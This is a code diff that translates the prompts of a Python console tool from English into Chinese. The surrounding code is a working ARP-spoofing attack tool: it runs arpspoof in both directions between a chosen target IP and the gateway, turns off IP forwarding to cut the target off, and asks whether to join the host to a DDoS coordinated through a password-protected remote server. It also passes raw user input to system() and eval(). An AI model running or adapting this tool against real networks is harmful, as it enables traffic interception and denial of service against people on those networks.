@@ -57,32 +57,32 @@ class Main:
 		event.commands(self.run_shell, ".")
 		event.commands(self.debug, "$")
 
-		event.help(["values", "ls"], "Show all options.")
+		event.help(["values", "ls"], "显示所有选项。")
 
-		event.help("gateway", "Set your gateway.")
-		event.help("target", "Target a local ip.")
-		event.help("interface", "Set the interface you would like to use.")
+		event.help("gateway", "设置网关。")
+		event.help("target", "指定本地 IP。")
+		event.help("interface", "设置要使用的接口。")
 
-		event.help("run", "Run the test.")
+		event.help("run", "运行测试。")
 
 	def banner(self):
 		system("clear || cls")
 
 		if "/" not in popen("command -v arpspoof").read():
-			input("\n[i] Please install DSniff to continue.\n[Press Enter to continue]")
+			input("\n[i] 请安装 DSniff 以继续。\n[按回车继续]")
 			system("clear || cls")
 			var.stop()
 			return
 
 		if "/" not in popen("command -v sysctl").read():
-			input("\n[i] Sysctl does not exist, this attack will not work.\n[Press Enter to continue]")
+			input("\n[i] 找不到 sysctl，此攻击无法运行。\n[按回车继续]")
 			system("clear || cls")
 			var.stop()
 			return
 
 		if geteuid_exists:
 			if geteuid() != 0:
-				input("\n[i] Please run with sudo privileges.\n[Press Enter to continue]")
+				input("\n[i] 请使用 sudo 权限运行。\n[按回车继续]")
 				system("clear || cls")
 				var.stop()
 				return
@@ -102,17 +102,17 @@ C_B----------------------------------------------------------C_W""").replace("C_
 		self.help()
 
 	def exit_console(self):
-		print("Have a nice day.")
+		print("祝您有美好的一天。")
 		quit()
 
 	def run_shell(self, command):
 		print("")
-		system(tools.arg("Enter shell command: ", ". ", command))
+		system(tools.arg("输入 shell 命令：", ". ", command))
 		print("")
 
 	def debug(self, command):
 		print("")
-		eval(tools.arg("Enter debug command: ", "$ ", command))
+		eval(tools.arg("输入调试命令：", "$ ", command))
 		print("")
 
 	def ip_forward_disable(self):
@@ -132,7 +132,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	@event.event
 	def on_command_not_found(command):
 		print("")
-		print("The command you entered does not exist.")
+		print("您输入的命令不存在。")
 		print("")
 
 	def check_session(self):
@@ -173,14 +173,14 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			status = requests.post((var.server[2] + "set/com"), data={"password": var.server[3], "data": command}).text
 			if status != "200":
 				print("")
-				print("An error occured, while sending commands to the server.")
+				print("发送命令到服务器时发生错误。")
 				print("")
 
 	@event.command
 	def debug():
 		var.arp_debug = True
 		print("")
-		print("Debugging mode enabled.")
+		print("已启用调试模式。")
 		print("")
 
 	def show_values(self):
@@ -198,52 +198,52 @@ C_B----------------------------------------------------------C_W""").replace("C_
 	@event.command
 	def target(command):
 		print("")
-		var.target = tools.arg("IP: ", "target ", command)
+		var.target = tools.arg("IP：", "target ", command)
 		if "." not in var.target:
-			print("This IP is invalid.")
+			print("该 IP 无效。")
 		print("")
 
 	@event.command
 	def gateway(command):
 		print("")
-		var.gateway = tools.arg("IP: ", "gateway ", command)
+		var.gateway = tools.arg("IP：", "gateway ", command)
 		if "." not in var.gateway:
-			print("This IP is invalid.")
+			print("该 IP 无效。")
 		print("")
 
 	@event.command
 	def interface(command):
 		print("")
-		var.interface = tools.arg("Interface: ", "interface ", command)
+		var.interface = tools.arg("接口：", "interface ", command)
 		print("")
 
 	def arp_target(self):
 		try:
 			system("sudo arpspoof -i %s -t %s %s &" % (var.interface, var.target, var.gateway))
-			var.command_log.append("Sucessful execution.")
+			var.command_log.append("执行成功。")
 		except Exception as ex:
-			var.command_log.append("ERROR: %s" % ex)
-			print("ERROR: %s" % ex)
+			var.command_log.append("错误：%s" % ex)
+			print("错误：%s" % ex)
 
 	def arp_router(self):
 		try:
 			system("sudo arpspoof -i %s -t %s %s &" % (var.interface, var.gateway, var.target))
-			var.command_log.append("Sucessful execution.")
+			var.command_log.append("执行成功。")
 		except Exception as ex:
-			var.command_log.append("ERROR: %s" % ex)
-			print("ERROR: %s" % ex)
+			var.command_log.append("错误：%s" % ex)
+			print("错误：%s" % ex)
 
 	@event.command
 	def run():
 		def execute():
 			print("")
-			print("To stop the attack press: ENTER or CTRL + C")
+			print("要停止攻击，请按：ENTER 或 CTRL + C")
 			print("")
 
 			var.ps1 = ""  # Change due to threading bug.
 
 			sleep(3)
-			print("Seting ip_forward to 0...")
+			print("正在将 ip_forward 设为 0...")
 			self.ip_forward_disable()
 			print("")
 			try:
@@ -251,10 +251,10 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					t = Thread(target=target)
 					t.start()
 			except Exception:
-				print("Could not start the attack.")
+				print("无法启动攻击。")
 
 			def reset_attack():
-				print("Stopping threads...")
+				print("正在停止线程...")
 				system("sudo killall -SIGINT arpspoof")
 				sleep(2)
 				while True:
@@ -269,7 +269,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 
 				self.ip_forward_reset()
 				if var.arp_debug:
-					print("Saving debugging log...")
+					print("正在保存调试日志...")
 					output_to = path.join(getcwd(), "arp_debug_log.txt")
 
 					write_method = "a"
@@ -285,7 +285,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					output_file.write(str(version + "\n"))
 					output_file.write(str("\n".join(var.command_log)))
 					output_file.close()
-				print("Done.")
+				print("完成。")
 				quit()
 
 			def check_stopped_execution():
@@ -307,7 +307,7 @@ C_B----------------------------------------------------------C_W""").replace("C_
 			if var.server[0] and var.server[1]:
 				status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
 				if status != "200":
-					print("An error occured, while sending data to the server.")
+					print("发送数据到服务器时发生错误。")
 
 			reset_attack()
 
@@ -319,27 +319,27 @@ C_B----------------------------------------------------------C_W""").replace("C_
 					break
 				else:
 					sleep(1)
-		elif not tools.question("\nDo you agree to the terms of use?"):
-			print("Agreement not accepted.")
+		elif not tools.question("\n您是否同意使用条款？"):
+			print("未接受协议。")
 			quit()
 		else:
 			if var.server[0] and var.server[1]:
-				if tools.question("\nWould you like to use the host as part of the ddos?"):
+				if tools.question("\n是否希望将该主机用作 DDoS 的一部分？"):
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("发送数据到服务器时发生错误。")
 					execute()
 				else:
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "True"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("发送数据到服务器时发生错误。")
 					try:
-						print("[Press Enter to stop the attack.]")
+						print("[按回车停止攻击。]")
 					except KeyboardInterrupt:
 						pass
 					status = requests.post((var.server[2] + "set/agreed"), data={"password": var.server[3], "data": "False"}).text
 					if status != "200":
-						print("An error occured, while sending data to the server.")
+						print("发送数据到服务器时发生错误。")
 			else:
 				execute()
 
